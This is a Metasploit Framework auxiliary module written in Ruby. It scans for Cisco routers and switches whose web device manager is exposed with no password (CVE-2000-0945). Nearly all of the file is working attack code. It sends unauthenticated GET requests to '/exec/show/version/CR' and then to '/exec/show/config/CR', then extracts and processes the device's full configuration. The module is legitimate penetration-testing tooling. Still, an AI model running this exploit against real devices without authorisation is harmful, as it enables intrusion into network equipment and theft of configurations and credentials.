##
# $Id: cisco_ios_auth_bypass.rb 11271 2010-12-10 05:47:33Z hdm $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'rex/proto/http'
require 'msf/core'



class Metasploit3 < Msf::Auxiliary
	
	# Exploit mixins should be called first
	include Msf::Exploit::Remote::HttpClient
	
	# Include Cisco utility methods
	include Msf::Auxiliary::Cisco
	
	# Scanner mixin should be near last
	include Msf::Auxiliary::Scanner

	def initialize(info={})
		super(update_info(info,
			'Name'           => 'Cisco Device HTTP Unauthenticated Access',
			'Description'    => %q{
					This module gathers data from a Cisco device (router or switch) with the device manager
				web interface exposed and no password set.	
			},
			'Author'		=> [ 'hdm' ],
			'License'		=> MSF_LICENSE,
			'Version'		=> '$Revision: 11271 $',
			'References'	=>
				[
					[ 'BID', '1846'],
					[ 'CVE', '2000-0945'],
					[ 'OSVDB', '444'],
				],
			'DisclosureDate' => 'Oct 26 2000'))
	end

	def run_host(ip)
	
		res = send_request_cgi({
			'uri'  		=>  "/exec/show/version/CR",
			'method'   	=> 'GET'
		}, 20)
			
		if res and res.body and res.body =~ /Cisco (Internetwork Operating System|IOS) Software/
			print_good("#{rhost}:#{rport} Found vulnerable device")
				
			report_vuln(
				:host	=> rhost,
				:port	=> rport,
				:name	=> 'IOS-HTTP-NO-AUTH',
				:info	=> "http://#{rhost}:#{rport}/exec/show/version/CR",
				:refs   =>
				[
					[ 'BID', '1846'],
					[ 'CVE', '2000-0945'],
					[ 'OSVDB', '444'],
				]
			)
				
			res = send_request_cgi({
				'uri'  		=>  "/exec/show/config/CR",
				'method'   	=> 'GET'
			}, 20)

			if res and res.body and res.body =~ /<FORM METHOD([^\>]+)\>(.*)/mi
				config = $2.gsub(/<\/[A-Z].*/i, '').strip
				print_good("#{rhost}:#{rport} Processing the configuration file...")
				cisco_ios_config_eater(rhost, rport, config)
			else
				print_error("#{rhost}:#{rport} Error: could not retrieve the IOS configuration")
			end
				
		end
		
	end

end

